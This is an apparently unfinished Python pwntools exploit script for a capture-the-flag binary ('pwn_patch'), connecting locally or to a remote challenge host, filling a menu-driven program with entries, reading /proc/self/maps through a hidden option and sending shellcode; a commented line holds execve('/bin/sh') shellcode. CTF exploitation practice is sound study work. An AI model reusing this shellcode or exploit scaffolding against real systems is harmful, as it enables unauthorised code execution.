#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian

from lianpwn import *
import sys
import base64

context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux", "sp", "-h", "-l", "120"]

LOCAL = 1
filename = "./pwn_patch"
if LOCAL:
    io = process(filename)
else:
    remote_service = "0192d5e50a0e782f997a59b19ae00e1f.yz78.dg06.ciihw.cn:46355"
    remote_service = remote_service.strip().split(":")
    io = remote(remote_service[0], int(remote_service[1]))
elf = ELF(filename, checksec=False)
libc = ELF(elf.libc.path, checksec=False)


def ru(a, drop=False):
    return io.recvuntil(a, drop)


rl = lambda a=False: io.recvline(a)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))


def pad_bytes_to_multiple_of_three(data: bytes) -> bytes:
    padding_needed = (-len(data)) % 3  # 计算需要填充的字节数
    if padding_needed:
        data += b"\x00" * padding_needed
    return data


def cmd(choice):
    ru(b"Your choice > ")
    sl(i2b(choice))


def gift():
    cmd(666)


def add(idx, name, data):
    cmd(1)
    ru(b"Idx > ")
    sl(i2b(idx))
    ru(b"Encrypted name > ")
    # sl(base64.b64encode(pad_bytes_to_multiple_of_three(name)))
    sl(name)
    ru(b"Message > ")
    sl(data)


debugB()

for i in range(10):
    add(i, b"aaabbbcc", b"bHAT CAN I SAY?!!!")

# add(0, b"aaa", b"a" * 0x100)
# add(1, b"bbb", b"b" * 0x100)
# add(2, b"aaabbbcccddd", b"bHAT CAN I SAY?!!!")

cmd(666)
ru(b"Idx >")
sl(i2b(0))
# shell_code = b"jBX\xfe\xc4H\x99RH\xbf/bin//shWT^I\x89\xd0I\x89\xd2\x0f\x05"
shell_code = b"\x90"
ru(b"You can open a file first >")
sl(b"/proc/self/maps")
ru(b"Input your shellcode >")
s(shell_code)
# ru(b"Encrypted name > ")
# sl(b"aaabbbcc")
# 0000 => e7799e
# 1111 => 200882

ia()

"""
while True:
    try:

        ia()
    except:
        io.close()
        if LOCAL:
            io = process(filename)
        else:
            io = remote(remote_service[0], int(remote_service[1]))
"""
